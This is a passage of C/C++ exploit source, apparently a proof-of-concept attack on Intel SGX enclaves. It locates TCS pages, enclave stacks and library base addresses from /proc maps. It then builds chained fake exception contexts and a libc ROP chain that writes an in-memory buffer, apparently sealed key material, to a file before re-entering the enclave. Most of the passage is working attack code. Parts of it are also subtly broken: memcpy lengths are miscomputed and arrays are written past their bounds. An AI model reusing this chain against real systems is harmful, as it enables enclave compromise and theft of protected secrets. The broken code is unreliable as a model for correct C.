  // OK: 0x3000 => 7fc247457000-7fc24745a000 rw-s 00457000 00:06 455 /dev/isgx
  while ((read = getline(&line, &len, fp)) != -1) {
    // char *l = line;
    if(strstr(line, "isgx") != NULL && strstr(line, "rw-s") != NULL) {
      // printf("%s", line);
      // printf("This line has a isgx and it is a possible stack.\n");

      // check if the block is 0x3000 long
      char* pEnd = strstr(line, " r");
      char* pStart = strstr(line, "-");

      if (pEnd == NULL || pStart == NULL) {
        printf("The line is broken, kill all!\n");
        free(line);
        exit(1);
      }

      // printf("start pos: %ld\n", pStart-line);
      // printf("end pos: %ld\n", pEnd-line);

      char startAddr[13];
      char endAddr[13];
      memcpy(startAddr, line, pStart-line);
      memcpy(endAddr, pStart+1, pEnd-line);
      startAddr[12] = {0};
      endAddr[12] = {0};
      // printf("-> start address: 0x%s\n", startAddr);
      // printf("-> end address: 0x%s\n", endAddr);
      uint64_t strt = (unsigned long)strtol(startAddr, NULL, 16);
      uint64_t end = (unsigned long)strtol(endAddr, NULL, 16);
      uint64_t delta = end-strt;

      if (prevEnd != strt) {
        prevStrt = strt;
	      deltaComulative = 0;
      }

      deltaComulative += delta;
      
      if (deltaComulative == 0x3000) {
        // tcs[i] =  (void*)strt;
        // printf("-> this is a TCS: 0x%lx\n", prevStrt);
        tcs[i] =  (void*)prevStrt;
        i++;
        if (i > l) {
          free(line);
          printf("Too many TCS!\n");
          exit(1);
        }
      }

      // printf("-> delta: 0x%lx\n", delta);
      // printf("-> deltaComulative: 0x%lx\n\n", deltaComulative);

      prevStrt = strt;
      prevEnd = end;
    }
    // deltaComulative = 0;
  }

  // printf("Exit for backup\n");
  fclose(fp);
  free(line);
  // exit(EXIT_SUCCESS);

  return i;
}

void getStackInfo(void* tcs, unsigned long* sStack, unsigned long* lStack) {
  FILE * fp;
  char* line[4] = {0};
  size_t len[4];
  ssize_t read;



  pid_t p = getpid();

  char fPath[100] = { 0 };
  //printf("PID = %d\n", p);

  snprintf(fPath, sizeof(fPath), "/proc/%d/maps", p);

  //printf("map file: %s\n", fPath);

  fp = fopen(fPath, "r");
  if (fp == NULL) {
      printf("fail opening: %s\n", fPath);
      exit(EXIT_FAILURE);
  }

  bool atLeastOne = false;
  int i = 0, j = -1;
  while ((read = getline(&line[i%4], &len[i%4], fp)) != -1) {
    //printf("%s\n", line[i%3]);
    // don't know why but I need this temp variable...
    char *l = line[i%4];
    if(strstr(l, "isgx") != NULL) {
      //printf("This line has a isgx\n");
      char* pEnd = strstr(l, "-");
      char strAddr[17] = { 0 };
      memcpy(strAddr, l, pEnd-l);
      strAddr[17] = {0};
      //printf("-> got an address: 0x%s\n", strAddr);
      unsigned long addr = (unsigned long)strtol(strAddr, NULL, 16);
      if (addr == (unsigned long)tcs) {
        j = i % 4;
        //printf("-> got it, let's read the stack\n");
        break;
      }
    }
    i++;
  }
  //printf("Last j = %d\n", j);
  int d = abs(j+1);
  //printf("Last d = %d\n", d);
  //printf("Original\n");
  //for(int i = 0; i < 4; i++) {
  //  printf("[%d] => %s\n", i, line[i]);
  //}
  //printf("Ordered\n");
  unsigned long a, b;
  for(int i = 0; i < 4; i++) {
    int k = (i + d) % 4;
    //printf("[%d] => %s\n", i, line[k]);
    char *l = line[k];

    // I just need the first 2 "ordered" lines
    if (i == 0) {
      char* pEnd = strstr(l, "-");
      char strAddr[17] = { 0 };
      memcpy(strAddr, l, pEnd-l);
      strAddr[17] = {0};
      a = (unsigned long)strtol(strAddr, NULL, 16);
    }
    if (i == 1) {
      char* pEnd = strstr(l, " r");
      char* pStart = strstr(l, "-");
      char strAddr[17] = { 0 };
      memcpy(strAddr, pStart+1, pEnd-l);
      strAddr[17] = {0};
      b = (unsigned long)strtol(strAddr, NULL, 16);
      break;
    }

  }

  *sStack = b;
  *lStack = b-a;

  //printf("a = %lx\n", a);
  //printf("b = %lx\n", b);
  //printf("stack size = 0x%lx\n", (b-a));

  //printf("Exit for backup\n");
  fclose(fp);
  //exit(EXIT_SUCCESS);
}

unsigned long getLibcBaseAddress() {
  FILE * fp;
  char * line = NULL;
  size_t len = 0;
  ssize_t read;

  pid_t p = getpid();

  char fPath[100] = { 0 };
  //printf("PID = %d\n", p);

  snprintf(fPath, 100, "/proc/%d/maps", p);

  //printf("map file: %s\n", fPath);

  fp = fopen(fPath, "r");
  if (fp == NULL) {
      printf("fail opening: %s\n", fPath);
      exit(EXIT_FAILURE);
  }

  bool atLeastOne = false;
  while ((read = getline(&line, &len, fp)) != -1) {
    if(strstr(line, "libc-") != NULL) {
      atLeastOne = true;
      break;
    }
  }

  fclose(fp);

  if (atLeastOne) {
    // I extract basic address
    printf("Found libc.so\n");
    //printf("isgx: %s\n", line);

    char* pEnd = strstr(line, "-");

    char strBaseAddr[17] = { 0 };

    memcpy(strBaseAddr, line, pEnd-line);
    strBaseAddr[17] = {0};

    //printf("Estimated base addr: 0x%s\n", strBaseAddr);

    unsigned long baseAddr = (unsigned long)strtol(strBaseAddr, NULL, 16);

    free(line);

    return baseAddr;
  }
  else {
    printf("I didn't find any libc.so!\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}

unsigned long getLibSgxUBaseAddress() {
  FILE * fp;
  char * line = NULL;
  size_t len = 0;
  ssize_t read;

  pid_t p = getpid();

  char fPath[100] = { 0 };
  //printf("PID = %d\n", p);

  snprintf(fPath, 100, "/proc/%d/maps", p);

  //printf("map file: %s\n", fPath);

  fp = fopen(fPath, "r");
  if (fp == NULL) {
      printf("fail opening: %s\n", fPath);
      exit(EXIT_FAILURE);
  }

  bool atLeastOne = false;
  while ((read = getline(&line, &len, fp)) != -1) {
    if(strstr(line, "libsgx_urts.so") != NULL) {
      atLeastOne = true;
      break;
    }
  }

  fclose(fp);

  if (atLeastOne) {
    // I extract basic address
    printf("Found libsgx_urts.so\n");
    //printf("isgx: %s\n", line);

    char* pEnd = strstr(line, "-");

    char strBaseAddr[17] = { 0 };

    memcpy(strBaseAddr, line, pEnd-line);
    strBaseAddr[17] = {0};

    //printf("Estimated base addr: 0x%s\n", strBaseAddr);

    unsigned long baseAddr = (unsigned long)strtol(strBaseAddr, NULL, 16);

    free(line);

    return baseAddr;
  }
  else {
    printf("I didn't find any libsgx_urts.so!\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}

void initiateChain(sgx_exception_info_t *ctx, unsigned long *fakeStack, size_t stackLen) {
  int nContext;
  for (int i = 0; i < stackLen; i++) {

    nContext = (i/3)+1;
    // first the glue
    if (i % 3 == 0) {
      fakeStack[i] = (unsigned long)glueGadget;
    }
    // second the next context
    if (i % 3 == 1) {
      fakeStack[i] = (unsigned long)&ctx[nContext];
      //ctx[nContext].cpu_context.rip = (unsigned long)gadget[nContext];
      if (nContext < stackLen/3)
        ctx[nContext].cpu_context.rsp = (unsigned long)&fakeStack[i + 2];
    }
    // third the continue_execution
    if (i % 3 == 2) {
      fakeStack[i] = (unsigned long)contexec;
    }

  }
}

void initiateChainEnclave(sgx_exception_info_t *ctx, unsigned long *fakeStack, unsigned long bkpCtx, unsigned long wsPc, size_t stackLen) {

  int nContext;

  for (int i = 0; i < stackLen; i++) {

    nContext = (i/3)+1;
    // first the glue
    if (i % 3 == 0) {
      fakeStack[i] = (unsigned long)glueGadget;
    }
    // second the next context
    if (i % 3 == 1) {
      //fakeStack[i] = (unsigned long)&ctx[nContext];
      fakeStack[i] = (unsigned long)bkpCtx + (sizeof(sgx_exception_info_t) * nContext);
      if (nContext < stackLen/3)
        //ctx[nContext].cpu_context.rsp = (unsigned long)&fakeStack[i + 2];
        ctx[nContext].cpu_context.rsp = (unsigned long)wsPc + (sizeof(unsigned long) * (i + 2));
    }
    // third the continue_execution
    if (i % 3 == 2) {
      fakeStack[i] = (unsigned long)contexec;
    }

  }

}

void setOc(unsigned long tcs) {

	unsigned long fd = 0x3;
	int idx = 0;

	// # eax = 0x02, edi = filename, esi = flags
  // creatfile
  Oc[idx] = POP_RAX_U + bLibc;idx++;
  Oc[idx] = 0x2;idx++;
  Oc[idx] = POP_RDI_U + bLibc;idx++;
  Oc[idx] = (unsigned long)fileOut;idx++;
	Oc[idx] = POP_RSI_U + bLibc;idx++;
	Oc[idx] = O_APPEND | O_CREAT | O_RDWR;idx++;
  Oc[idx] = POP_RDX_U + bLibc;idx++;
  Oc[idx] = S_IRWXU;idx++;
  Oc[idx] = SYSCALL + bLibc;idx++;

  // write file
  // rax = 0x1, rdi = fd (0x5), rsi = writeable_buffer, rdx = count
  Oc[idx] = POP_RAX_U + bLibc;idx++;
  Oc[idx] = 0x1;idx++;
  Oc[idx] = POP_RDI_U + bLibc;idx++;
  Oc[idx] = fd;idx++;
  Oc[idx] = POP_RSI_U + bLibc;idx++;
  Oc[idx] = (unsigned long)buff;idx++;
  Oc[idx] = POP_RDX_U + bLibc;idx++;
  Oc[idx] = sizeof(buff);idx++;
  Oc[idx] = SYSCALL + bLibc;idx++;

  // close file
  // rax = 0x3, rdi = fd (0x4)
  Oc[idx] = POP_RAX_U + bLibc;idx++;
  Oc[idx] = 0x3;idx++;
  Oc[idx] = POP_RDI_U + bLibc;idx++;
  Oc[idx] = fd;idx++;
  Oc[idx] = SYSCALL + bLibc;idx++;


	// lea    rax,[rbp-0x12]
	// mov    edx,0xa
	// mov    esi,0x0
	// mov    rdi,rax

	// wipe buff
  // rdi = buff, rsi = 0, rdx = sizeof(buff)
  Oc[idx] = POP_RDI_U + bLibc;idx++;
  Oc[idx] = (unsigned long)buff;idx++;
  Oc[idx] = POP_RSI_U + bLibc;idx++;
  Oc[idx] = 0x0;idx++;
	Oc[idx] = POP_RDX_U + bLibc;idx++;
	Oc[idx] = sizeof(buff);idx++;
  Oc[idx] = (unsigned long)&memset;idx++;
  // Oc[idx] = MEMSET_U + bLibc;idx++;

  // resume Pc
  Oc[idx] = POP_RAX_U + bLibc;idx++;
  Oc[idx] = EENTER;idx++;
  Oc[idx] = POP_RBX_U + bLibc;idx++;
  Oc[idx] = tcs;idx++;
  Oc[idx] = POP_RDI_U + bLibc;idx++;
  Oc[idx] = -2;idx++; // oret
  Oc[idx] = POP_RCX_U + bLibc;idx++; // Lasync_exit_pointer`
  Oc[idx] = ENCLU_URTS + bLibSgxU;idx++;
  Oc[idx] = ENCLU_URTS + bLibSgxU;idx++;

	if (idx > sizeof(buff)/sizeof(buff[0])) {
		cout << "outside chain too long: ";
		cout << idx << "/" << sizeof(buff)/sizeof(buff[0]) << endl;
		exit(1);
	}
}

void add(void * d, unsigned long int x, size_t *s) {
  memcpy(d, &x, 8);
  if (s)
    *s += sizeof(unsigned long int);
}

void printBuff() {

	ifstream in_file(fileOut, ios::binary | ios::ate);
	size_t file_size = in_file.tellg();
	cout << (file_size/SEALED_KEY_LENGTH) << '\n';

	in_file.close();

	// for (const auto& e : buff)
  //   cout << hex << (int)e << " ";
	// cout << endl;
}
